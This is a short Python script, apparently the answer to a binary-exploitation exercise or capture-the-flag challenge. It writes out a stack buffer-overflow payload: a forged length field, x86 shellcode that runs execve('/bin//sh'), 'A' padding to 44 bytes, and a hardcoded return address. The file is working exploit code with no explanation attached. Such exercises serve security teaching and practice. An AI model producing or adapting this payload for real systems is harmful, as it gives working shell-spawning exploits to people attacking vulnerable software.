#!/usr/bin/python3
from struct import pack
#from shellcode import shellcode
import sys

shellcode = b"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"
fake_len = b"\x00\x00\x00\x40"

padding_len = 44-len(shellcode)
padding = b'A'*padding_len

return_addr = b"\x00\x8a\xfe\xff"

sys.stdout.buffer.write(fake_len + shellcode + padding + return_addr)
